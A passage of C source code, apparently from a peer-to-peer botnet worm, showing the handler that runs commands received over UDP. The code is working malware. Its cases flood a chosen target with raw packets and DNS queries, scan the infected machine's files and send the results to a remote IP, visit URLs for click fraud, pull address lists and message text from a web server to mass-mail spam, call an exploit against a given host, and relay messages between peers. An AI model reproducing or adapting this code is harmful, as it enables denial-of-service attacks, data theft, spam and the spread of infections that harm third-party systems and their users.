                        if (udpserver.len < sizeof(struct gen_rec)+rp->h.len || rp->h.len > 2999-sizeof(struct gen_rec)) break;
                        if (!isreal(rp->target)) {
                            senderror(&udpclient,rp->h.id,"Cannot packet local networks\n");
                            break;
                        }
                        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) break;
                        senderror(&udpclient,rp->h.id,"Sending packets to target\n");
                        memset((void*)&in,0,sizeof(struct sockaddr_in));
                        in.sin_addr.s_addr=rp->target;
                        in.sin_family=AF_INET;
                        in.sin_port=htons(rp->port);
                        while(1) {
                            sendto(get,buf+sizeof(struct gen_rec),rp->h.len,0,(struct sockaddr *)&in,sizeof(in));
                            if (time(NULL) >= start+rp->secs) break;
                        }
                        close(get);
                        } break;
                    case 0x2C: { // Dns inondazione
                        struct dns {
                            unsigned short int id;
                            unsigned char  rd:1;
                            unsigned char  tc:1;
                            unsigned char  aa:1;
                            unsigned char  opcode:4;
                            unsigned char  qr:1;
                            unsigned char  rcode:4;
                            unsigned char  unused:2;
                            unsigned char  pr:1;
                            unsigned char  ra:1;
                            unsigned short int que_num;
                            unsigned short int rep_num;
                            unsigned short int num_rr;
                            unsigned short int num_rrsup;
                            char buf[128];
                        } dnsp;
                        unsigned long len=0,i=0,startm;
                        int fd,flag;
                        char *convo;
                        struct sockaddr_in in;
                        struct df_rec *rp=(struct df_rec *)buf;
                        time_t start=time(NULL);
                        if (udpserver.len < sizeof(struct df_rec)+rp->h.len || rp->h.len > 2999-sizeof(struct df_rec)) break;
                        if (!isreal(rp->target)) {
                            senderror(&udpclient,rp->h.id,"Cannot packet local networks\n");
                            break;
                        }
                        senderror(&udpclient,rp->h.id,"Dns flooding target\n");
                        memset((void*)&in,0,sizeof(struct sockaddr_in));
                        in.sin_addr.s_addr=rp->target;
                        in.sin_family=AF_INET;
                        in.sin_port=htons(53);
                        dnsp.rd=1;
                        dnsp.tc=0;
                        dnsp.aa=0;
                        dnsp.opcode=0;
                        dnsp.qr=0;
                        dnsp.rcode=0;
                        dnsp.unused=0;
                        dnsp.pr=0;
                        dnsp.ra=0;
                        dnsp.que_num=256;
                        dnsp.rep_num=0;
                        dnsp.num_rr=0;
                        dnsp.num_rrsup=0;
                        convo=buf+sizeof(struct df_rec);
                        convo[rp->h.len]=0;
                        _decrypt(convo,rp->h.len);
                        for (i=0,startm=0;i<=rp->h.len;i++) if (convo[i] == '.' || convo[i] == 0) {
                            convo[i]=0;
                            sprintf(dnsp.buf+len,"%c%s",(unsigned char)(i-startm),convo+startm);
                            len+=1+strlen(convo+startm);
                            startm=i+1;
                        }
                        dnsp.buf[len++]=0;
                        dnsp.buf[len++]=0;
                        dnsp.buf[len++]=1;
                        dnsp.buf[len++]=0;
                        dnsp.buf[len++]=1;
                        while(1) {
                            dnsp.id=rand();
                            if ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);
                            else {
                                flag = fcntl(fd, F_GETFL, 0);
                                flag |= O_NONBLOCK;
                                fcntl(fd, F_SETFL, flag);
                                sendto(fd,(char*)&dnsp,sizeof(struct dns)+len-128,0,(struct sockaddr*)&in,sizeof(in));
                                close(fd);
                            }
                            if (i >= 50) {
                                if (time(NULL) >= start+rp->secs) break;
                                i=0;
                            }
                            i++;
                        }
                        } break;
                    case 0x2D: {
                        char ip[256];
                        struct escan_rec *rp=(struct escan_rec *)buf;
                        if (udpserver.len < sizeof(struct escan_rec)) break;
                        if (!isreal(rp->ip)) {
                            senderror(&udpclient,rp->h.id,"Invalid IP\n");
                            break;
                        }
                        conv(ip,256,rp->ip);
                        if (mfork() == 0) {
                            struct _linklist *getb;
                            struct ainst client;
                            StartScan("/");
                            audp_setup(&client,(char*)ip,ESCANPORT);
                            getb=linklist;
                            while(getb != NULL) {
                                unsigned long len=strlen(getb->name);
                                audp_send(&client,getb->name,len);
                                getb=getb->next;
                            }
                            audp_close(&client);
                            exit(0);
                        }
                        } break;
                    case 0x2E: {
                        struct click_rec *rp=(struct click_rec *)buf;
                        if (udpserver.len < sizeof(struct click_rec)+rp->h.len || rp->h.len > 2999-sizeof(struct click_rec)) break;
                        (buf+sizeof(struct click_rec))[rp->h.len]=0;
                        _decrypt(buf+sizeof(struct click_rec),rp->h.len);
                        if (mfork() == 0) {
                            ViewWebsite(strdup(buf+sizeof(struct click_rec)),NULL);
                            exit(0);
                        }
                        } break;
                    case 0x2F: {
                        struct spam_rec *rp=(struct spam_rec *)buf;
                        struct kill_rec np;
                        struct ainst up;
                        char *server,bufm[4096],*tmp,*str;
                        char *from=NULL,*subject=NULL,*data=NULL,*emails=NULL;
                        long i,d;
                        unsigned long emailcount=0;
                        if (udpserver.len < sizeof(struct spam_rec)+rp->h.len || rp->h.len > 2999-sizeof(struct spam_rec)) break;
                        memset((void*)&np,0,sizeof(struct kill_rec));
                        (buf+sizeof(struct spam_rec))[rp->h.len]=0;
                        _decrypt(buf+sizeof(struct spam_rec),rp->h.len);
                        if (!strncmp(buf+sizeof(struct spam_rec),"http://",7)) server=buf+sizeof(struct spam_rec)+7;
                        else server=buf+sizeof(struct spam_rec);
                        for (i=0;i<strlen(server) && server[i] != '/';i++);
                        server[i]=0;
                        if (mfork() == 0) {
                            struct ainst *g[1];
                            if (atcp_connect(&up,server,80) != 0) {
                                senderror(&udpclient,rp->h.id,"Unable to connect to host\n");
                                exit(0);
                            }
                            atcp_sendmsg(&up,"GET /%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n",server+i+1,server);
                            g[0]=&up;
                            if (await(g,1,AREAD,20) != 0 || atcp_recv(&up,bufm,4096) != 0 || up.len == 0) {
                                senderror(&udpclient,rp->h.id,"Error communicating with website\n");
                                exit(0);
                            }
                            for (d=0;d<up.len-3;d++) if (!strncmp(bufm+d,"\r\n\r\n",4)) {
                                int mode=0,lpass=0;
                                d+=4;
                                goto read;
                                while(1) {
                                    struct ainst *g[1];
                                    g[0]=&up;
                                    if (await(g,1,AREAD,20) != 0) {
                                        senderror(&udpclient,rp->h.id,"Timed out while receiving data\n");
                                        exit(0);
                                    }
                                    if (atcp_recv(&up,bufm,4096) != 0 || up.len <= 0) break;
                                    d=0;
                                    read:
                                    for (;d<up.len;d++) {
                                        if (!strncmp(bufm+d,"----FROM----",strlen("----FROM----"))) {
                                            mode=1;
                                            lpass=1;
                                            continue;
                                        }
                                        if (!strncmp(bufm+d,"----SUBJECT----",strlen("----SUBJECT----"))) {
                                            mode=2;
                                            lpass=1;
                                            continue;
                                        }
                                        if (!strncmp(bufm+d,"----DATA----",strlen("----DATA----"))) {
                                            mode=3;
                                            lpass=1;
                                            continue;
                                        }
                                        if (!strncmp(bufm+d,"----EMAILS----",strlen("----EMAILS----"))) {
                                            mode=4;
                                            lpass=1;
                                            continue;
                                        }
                                        switch (mode) {
                                            case 1:
                                                str=from;
                                                break;
                                            case 2:
                                                str=subject;
                                                break;
                                            case 3:
                                                str=data;
                                                break;
                                            case 4:
                                                str=-1;
                                                if (bufm[d] == '\n') if (!lpass) emailcount++;
                                                if (emailcount >= rp->from && emailcount < rp->to) str=emails;
                                                if (bufm[d] == '\n' && emails == NULL) str=-1;
                                                break;
                                            default:
                                                str=-1;
                                        }
                                        if (str != -1 && !lpass) {
                                            int dontfree=0;
                                            if (str == NULL) {
                                                str="";
                                                dontfree=1;
                                            }
                                            tmp=malloc(strlen(str)+2);
                                            strcpy(tmp,str);
                                            tmp[strlen(str)]=bufm[d];
                                            tmp[strlen(str)+1]=0;
                                            if (!dontfree) free(str);
                                            str=tmp;
                                            switch (mode) {
                                                case 1:
                                                    from=str;
                                                    break;
                                                case 2:
                                                    subject=str;
                                                    break;
                                                case 3:
                                                    data=str;
                                                    break;
                                                case 4:
                                                    if (emailcount >= rp->from && emailcount < rp->to) emails=str;
                                                    break;
                                            }
                                        }
                                        if (bufm[d] == '\n') lpass=0;
                                    }
                                }
                                break;
                            }
                            atcp_close(&up);
                            np.h.tag=0x42;
                            np.h.seq=newseq();
                            np.h.id=rp->h.id;
                            audp_send(&udpclient,(void*)&np,sizeof(struct kill_rec));
                            if (!from || !subject || !data || !emails) exit(0);
                            str=emails;
                            do {
                                int pid;
                                memset(bufm,0,4096);
                                for (i=0;str[i] != 0 && str[i] != '\n';i++) bufm[i]=str[i];
                                if ((pid=fork()) == 0) {
                                    alarm(10);
                                    SendMail(bufm,from,subject,data);
                                    exit(0);
                                }
                                waitpid(pid,0,0);
                                tmp=strchr(str,'\n');
                                if (tmp == NULL) break;
                                else str=tmp+1;
                            } while(1);
                            exit(0);
                        }
                        } break;
                    case 0x30: {
                        struct exploit_rec *rp=(struct exploit_rec *)buf;
                        if (udpserver.len < sizeof(struct exploit_rec)) break;
                        if (isreal(rp->ip)) {
                            char srv[256];
                            conv(srv,256,rp->ip);
                            if (mfork() == 0) {
                                exploit(srv);
                                exit(0);
                            }
                        }
                        } break;
                    case 0x70: { // Avviano
                        struct {
                            struct addsrv_rec a;
                            unsigned long server;
                        } rc;
                        struct myip_rec rp;
                        if (!isreal(udpclient.in.sin_addr.s_addr)) break;
                        memset((void*)&rp,0,sizeof(struct myip_rec));
                        rp.h.tag=0x73;
                        rp.h.id=0;
                        rp.ip=udpclient.in.sin_addr.s_addr;
                        audp_send(&udpclient,(void*)&rp,sizeof(struct myip_rec));
                        memset((void*)&rc,0,sizeof(rc));
                        rc.a.h.tag=0x71;
                        rc.a.h.id=0;
                        rc.a.h.len=sizeof(unsigned long);
                        rc.server=udpclient.in.sin_addr.s_addr;
                        broute(0,(void*)&rc,sizeof(rc));
                        addserver(rc.server);
                        syncm(&udpclient,0x71,0);
                        } break;
                    case 0x71: { // Aggiungere alla lista
                        struct addsrv_rec *rp=(struct addsrv_rec *)buf;
                        struct next_rec { unsigned long server; };
                        unsigned long a;
                        char b=0;
                        if (udpserver.len < sizeof(struct addsrv_rec)) break;
                        for (a=0;rp->h.len > a*sizeof(struct next_rec) && udpserver.len > sizeof(struct addsrv_rec)+(a*sizeof(struct next_rec));a++) {
                            struct next_rec *fc=(struct next_rec*)(buf+sizeof(struct addsrv_rec)+(a*sizeof(struct next_rec)));
                            addserver(fc->server);
                        }
                        for (a=0;a<numlinks;a++) if (links[a] == udpclient.in.sin_addr.s_addr) b=1;
                        if (!b && isreal(udpclient.in.sin_addr.s_addr)) {
                            struct {
                                struct addsrv_rec a;
                                unsigned long server;
                            } rc;
                            struct myip_rec rp;
                            memset((void*)&rc,0,sizeof(rc));
                            rc.a.h.tag=0x71;
                            rc.a.h.id=0;
                            rc.a.h.len=sizeof(unsigned long);
                            rc.server=udpclient.in.sin_addr.s_addr;
                                   audp_send(&udpclient,(void*)&rc,sizeof(rc));
                            memset((void*)&rp,0,sizeof(struct myip_rec));
                            rp.h.tag=0x73;
                            rp.h.id=0;
                            rp.ip=udpclient.in.sin_addr.s_addr;
                            audp_send(&udpclient,(void*)&rp,sizeof(struct myip_rec));
                            addserver(udpclient.in.sin_addr.s_addr);
                        }
                        } break;
                    case 0x72: { // Trasmettere la lista
                        syncm(&udpclient,0x71,0);
                        } break;
                    case 0x73: { // Ottenere mio IP
                        struct myip_rec *rp=(struct myip_rec *)buf;
                        if (udpserver.len < sizeof(struct myip_rec)) break;
                        if (!myip && isreal(rp->ip)) myip=rp->ip;
                        } break;
                    case 0x74: { // Trasmettere i vostri IP
                        struct myip_rec rc;
                        memset((void*)&rc,0,sizeof(struct myip_rec));
                        rc.h.tag=0x73;
                        rc.h.id=0;
                        rc.ip=udpclient.in.sin_addr.s_addr;
                        if (!isreal(rc.ip)) break;
                        audp_send(&udpclient,(void*)&rc,sizeof(struct myip_rec));
                        } break;
                    case 0x41:   //  --|
                    case 0x42:   //    |
                    case 0x43:   //    |
                    case 0x44:   //    |---> Dati dell' utente
                    case 0x45:   //    |
                    case 0x46: { //  --|
                        unsigned long a;
                        struct header *rc=(struct header *)buf;
                        if (udpserver.len < sizeof(struct header)) break;
                        if (!useseq(rc->seq)) {
                            addseq(rc->seq);
                            for (a=0;a<LINKS;a++) if (routes[a].id == rc->id) {
                                struct ainst ts;
                                char srv[256];
                                conv(srv,256,routes[a].ip);
                                audp_setup(&ts,srv,routes[a].port);
                                audp_close(&ts);
                                ts.sock=udpserver.sock;
                                audp_send(&ts,buf,udpserver.len);
                                break;
                            }
                        }
                        } break;
                }
            }
        }
    }
    audp_close(&udpserver);
    return 0;
}
